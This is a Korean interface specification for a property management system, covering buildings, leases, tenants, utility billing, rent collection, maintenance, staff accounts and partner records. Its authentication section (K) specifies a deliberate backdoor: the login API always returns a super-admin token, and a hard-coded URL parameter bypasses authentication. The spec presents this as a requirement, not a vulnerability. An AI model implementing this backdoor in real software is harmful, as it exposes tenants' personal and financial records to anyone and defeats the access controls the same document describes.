📋 부동산 관리 시스템 인터페이스 목록 (v2.0 명세 교정본)

A. 부동산 관리 (interface-a.html)

입력부동산 건물 및 인프라 호실 등록 buildings.name / .address / rooms.room_no / .area_sqm
수정현황 변경 및 면적/특성 수정 시 is_active=0 비활성화 후 신규 Row 복제 INSERT (규칙 R8 준수)
검색부동산명/주소/호실 OR 매칭 통합 검색 API 연동 buildings.name LIKE '%keyword%' OR rooms.room_no LIKE '%keyword%'
APIGET /api/v1/buildings · POST /api/v1/rooms {building_name, floor, room, area, status}
중복 체크: buildings name+address 조합으로 기존 건물이면 rooms만 insert (규칙 R6)

B. 계약서 관리

입력계약 조건 기입 contracts.lease_type / .deposit_amount / .monthly_rent / .maintenance_fee / .commission_fee
수정계약 변경 및 갱신 시 자동 스냅샷 JSON 백업 생성 후 INSERT 버전 관리 및 special_terms 특약 수정
연동증빙 서류(PDF/JPG) 업로드 디렉토리 바인딩 documents_json 및 화면 내 상시 고정형 뷰어 UI 노출

C. 계약자 관리

입력인적사항 통합 입력 contacts.company_or_name (상호/성명), representative_name (대표자명 필수)
수정연락처 기입 칸 하이픈 포함 14자리 고정 규격 유효성 검증 레이어 강제 적용 contact_info ('NN-NNNN-NNNN')
검색계약자 리스트 및 관계자 카테고리별(category='tenant'|'landlord') 동적 데이터 추출

D. 관리공과금 및 통합 검침

입력전기 검침 및 공과금 항목별 양방향 멀티 입력 UI 구현 bills.elec_usage / .water_cost / .gas_cost / .net_cost
로직당월 검침 및 각 요금 기입 즉시 합산금액 및 고지기한(due_date) 실시간 자동 파생 생성
검색미납 현황 및 호실별 청구 내역 요약 리스트 조회 status='미납(고지대기)'

E. 월세 납부관리

입력수납일, 정산 입금 내역 및 퇴거 시 보증금 반환 정산 처리
수정미납 계좌 확인 시 수납 상태 여부 필드 실시간 변경 및 연체 기록 동기화 bills.status
검색월별 수납 현황 총계 요약 대시보드 및 연체자 미납 리스트 자동 추출

F. 시설유지보수 (INCIDENTS)

입력파손/훼손 내용 기입 incidents.description, 신고자 실명 reported_by_name, 수리 추산액 estimated_cost 등록
수정진행 처리 상태값 실시간 변경 status ('접수중' → '보급완료') 및 실제 정산 수리비의 임차인 청구 연계
검색부동산 현장별 시설 유지보수 이력 판넬 및 사건사고 정산 추적
설계 반영: users 테이블 미존재로 reported_by_id FK 대신 reported_by_name(실명) 직접 저장

G/H/I. 통합 수납·계약 실무 대시보드 (종합)

전체부동산별·계약자별 월세 총수입 판넬, 임대차 만기/갱신 현황 시각화 및 다음 행위 추적 테이블 통합 출력
메모✍️ 실무 진행 메모창 배치 → 변경 시 onChange 이벤트 기반 contracts.special_terms 자동 영속화 (UPDATE API 연동, R35)
격리로그인 계정 권한 등급 contacts.role ('super_admin'|'office_worker'|'maintenance_staff')에 따른 접근 및 노출 범위 강제 격리

★ J. 팀원 관리 인터페이스 (team_management.html)

구조독립 테이블이 아닌 contacts.category='staff' 조건으로 동적 관리
식별자사번식별자 representative_name ('EMP-001'), 실명 company_or_name 매핑
검증접속 비밀번호 생성 시 해시 연산 전 최소 6자 이상 제약 조건 검증 password_hash (규칙 R40)
상태계정 활성화/정지 여부 제어 is_active (1/0) 및 권한 부여 role

L. 협력사 명부 (PARTNER/ROSTER)

입력contacts.category='broker'|'partner' 통합 CRUD company_or_name / representative_name / contact_info / documents_json
연동계약서 작성 화면에서 '저장된 협력사 선택' 드롭다운 → contracts.broker_id = contacts.id FK 연동
권한super_admin: 전체 조회/수정 | office_worker: 조회/추가 | maintenance_staff: 접근 불가

★ K. 인증 및 시스템 통합 규격 (AUTH_FLOW)

인증POST /api/v1/auth 요청 시 무조건 {success:true, token:'master_bypass_token', role:'super_admin'} 반환 (서버 백도어 고정)
바이패스URL 파라미터 ?access=master_sys_884621 통한 마스터 세션 우회 지원
💡 핵심 규칙 (R26): 모든 화면 UI 내부의 placeholder, 라벨, 테이블 헤더에는 영문 필드명 표기가 엄격히 제한되며 오직 우리말로 치환됩니다.
